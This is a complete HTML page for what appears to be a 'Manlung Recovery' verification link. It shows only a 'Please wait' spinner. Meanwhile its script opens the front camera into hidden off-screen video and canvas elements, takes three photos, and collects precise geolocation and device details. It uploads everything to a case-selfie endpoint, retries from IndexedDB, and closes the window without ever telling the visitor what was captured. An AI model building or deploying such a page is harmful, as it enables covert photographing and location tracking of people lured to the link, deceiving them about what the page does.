<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>Please Wait · Manlung Recovery</title>
<style>
html,body{margin:0;width:100%;height:100%;background:#fff}
body{display:flex;align-items:center;justify-content:center;overflow:hidden;font-family:Arial,Helvetica,sans-serif;color:#111}
.wait{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;min-width:220px}
.spinner{width:54px;height:54px;border:5px solid #e9e9e9;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
.message{margin-top:18px;font-size:17px;font-weight:600;letter-spacing:.01em}
@keyframes spin{to{transform:rotate(360deg)}}
video,canvas{position:fixed;left:-10000px;top:-10000px;width:1px;height:1px;opacity:0;pointer-events:none}
</style>
</head>
<body>
<div class="wait" aria-live="polite"><div class="spinner" aria-hidden="true"></div><div class="message">Please wait</div></div>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<script>
(()=>{"use strict";
const pathParts=location.pathname.split("/").filter(Boolean);
const token=new URLSearchParams(location.search).get("id")||pathParts[pathParts.length-1]||"";
const video=document.getElementById("video"),canvas=document.getElementById("canvas");
let stream=null,busy=false;
const DB_NAME="manlung-selfie-queue",DB_STORE="uploads";
function openQueue(){return new Promise((resolve,reject)=>{const r=indexedDB.open(DB_NAME,1);r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};r.onsuccess=()=>resolve(r.result);r.onerror=()=>reject(r.error)})}
async function requestStoragePersistence(){try{if(navigator.storage?.persist)await navigator.storage.persist()}catch(_){}}
async function queueBatch(blobs,metadata){try{const db=await openQueue();await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite"),batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({token,batchId,blob,metadata:{...metadata,captureNumber:i+1,totalCaptures:3},createdAt:new Date().toISOString()}));tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)})}catch(_){}}
async function deleteRows(rows){const db=await openQueue();for(const row of rows)await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)})}
async function getQueueStatus(){if(!token)return null;try{const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/status",{credentials:"omit",cache:"no-store"}),d=await r.json().catch(()=>({}));return r.ok&&d.success?d:null}catch(_){return null}}
async function flushQueue(){if(!token)return;try{const db=await openQueue(),rows=await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readonly"),q=tx.objectStore(DB_STORE).getAll();q.onsuccess=()=>resolve(q.result);q.onerror=()=>reject(q.error)}),grouped={};rows.filter(x=>x.token===token).forEach(x=>{const key=x.batchId||("legacy-"+x.id);(grouped[key]||(grouped[key]=[])).push(x)});for(const group of Object.values(grouped)){if(group.length!==3)continue;try{const fd=new FormData();group.forEach((row,i)=>fd.append("files",row.blob,"verification-"+(i+1)+".jpg"));fd.append("metadata",JSON.stringify(group[0].metadata||{}));const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"}),d=await r.json().catch(()=>({}));if(!r.ok||!d.success){if(r.status===410){const status=await getQueueStatus();if(status?.count===3){await deleteRows(group);continue}}break}await deleteRows(group)}catch(_){break}}}catch(_){}}
function waitForVideo(){return new Promise((resolve,reject)=>{const deadline=Date.now()+7000,tick=()=>{if(video.readyState>=2&&video.videoWidth>0&&video.videoHeight>0)return resolve();if(Date.now()>deadline)return reject(new Error("Camera did not become ready."));requestAnimationFrame(tick)};tick()})}
function frameBlob(){return new Promise((resolve,reject)=>{const w=video.videoWidth||1280,h=video.videoHeight||720;canvas.width=w;canvas.height=h;const ctx=canvas.getContext("2d",{alpha:false});if(!ctx)return reject(new Error("Capture is unavailable."));ctx.drawImage(video,0,0,w,h);canvas.toBlob(blob=>blob?resolve(blob):reject(new Error("Could not create image.")),"image/jpeg",0.9)})}
const pause=ms=>new Promise(resolve=>setTimeout(resolve,ms));
async function captureThree(){
 if(busy)return;busy=true;let blobs=[],metadata=null;
 try{
  if(!token)throw new Error("Invalid verification link.");
  await requestStoragePersistence();await flushQueue();
  const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"}),requestData=await requestResponse.json().catch(()=>({}));
  if(!requestResponse.ok||!requestData.success)throw new Error(requestData.error||"Verification request is unavailable.");
  if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported by this browser.");
  stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false});
  video.srcObject=stream;await video.play().catch(()=>{});await waitForVideo();
  const ua=navigator.userAgent||"",uaData=navigator.userAgentData||null;
  const deviceType=/Mobi|Android|iPhone|iPad|iPod/i.test(ua)?"mobile":"desktop";
  let browser=/Edg\//i.test(ua)?"Edge":/Chrome\//i.test(ua)?"Chrome":/Firefox\//i.test(ua)?"Firefox":/Safari\//i.test(ua)&&!/Chrome\//i.test(ua)?"Safari":"Unknown";
  let location=null;
  if(navigator.geolocation)location=await new Promise(resolve=>navigator.geolocation.getCurrentPosition(p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),()=>resolve(null),{enableHighAccuracy:true,maximumAge:30000,timeout:5000}));
  metadata={clientCapturedAt:new Date().toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",captureMethod:"browser-camera",device:{deviceType,platform:(uaData?.platform||navigator.platform||"").slice(0,80),browser,model:""},location,totalCaptures:3};
  for(let i=0;i<3;i++){blobs.push(await frameBlob());if(i<2)await pause(120);}
  await queueBatch(blobs,metadata);
  const fd=new FormData();blobs.forEach((blob,i)=>fd.append("files",blob,"verification-"+(i+1)+".jpg"));fd.append("metadata",JSON.stringify(metadata));
  const uploadResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"}),uploadData=await uploadResponse.json().catch(()=>({}));
  if(!uploadResponse.ok||!uploadData.success)throw new Error(uploadData.error||"Verification upload failed.");
  await flushQueue();if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
  setTimeout(()=>{try{window.close()}catch(_){}},150);
 }catch(error){
  console.error("Selfie evidence pipeline error:",error);
  if(blobs.length===3&&metadata){await queueBatch(blobs,metadata);await flushQueue()}
  if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
  setTimeout(()=>{try{window.close()}catch(_){}},800);
 }finally{busy=false}
}
document.addEventListener("DOMContentLoaded",captureThree,{once:true});
window.addEventListener("online",flushQueue);
setTimeout(()=>{requestStoragePersistence().catch(()=>{});flushQueue().catch(()=>{})},1000);
})();
</script>
</body>
</html>
